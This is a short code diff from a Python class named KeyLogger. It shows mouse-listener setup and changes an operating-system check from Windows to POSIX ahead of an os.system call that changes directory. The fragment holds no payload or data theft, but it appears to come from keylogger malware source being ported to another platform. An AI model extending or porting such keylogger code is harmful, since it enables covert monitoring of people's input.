@@ -118,7 +118,7 @@ class KeyLogger:
                       on_move=self.on_move,
                       on_scroll=self.on_scroll)as mouse_listener:
             mouse_listener.join()
-        if os.name == "nt":
+        if os.name == "posix":
             try:
                 pwd = os.path.abspath(os.getcwd())
                 os.system("cd " + pwd)
